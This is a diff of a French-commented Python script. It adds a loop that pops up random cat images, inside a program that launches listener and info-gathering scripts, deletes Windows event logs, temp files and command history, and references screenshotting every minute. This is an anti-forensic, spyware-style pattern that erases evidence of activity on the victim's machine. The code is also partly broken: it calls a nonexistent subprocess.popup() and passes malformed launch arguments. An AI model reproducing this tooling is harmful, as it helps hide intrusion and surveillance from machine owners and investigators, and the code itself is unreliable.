@@ -71,14 +71,12 @@ def clear_command_history():
         print(f"Erreur lors de la suppression de l'historique des commandes: {e}")     
  
 
-############################################################
-
-# for i in range(10):
-#     time.sleep(0.1)
-#     rand = random.randint(2, 76)
-#     image = Image.open("chat/"+str(rand)+".png")
-#     print("oui")
-#     image.show()
+def popup():
+    for i in range(10):
+        time.sleep(0.1)
+        rand = random.randint(2, 76)
+        image = Image.open("chat/"+str(rand)+".png")
+        image.show()
 
 # Exécuter la fonction
 #capture_ecran_toutes_les_1_minutes()
@@ -87,7 +85,7 @@ def Main():
     subprocess.Popen(['cmd', '--', 'python3', 'listen.py'])
     subprocess.Popen(['cmd', '--', 'python3', 'info.py'])
     time.sleep(100)
-    #subprocess.popup()
+    subprocess.popup()
     subprocess.Popen(['cmd', '--', 'python3', 'Zzzz.py'])
     delete_event_logs()
     delete_temp_files()
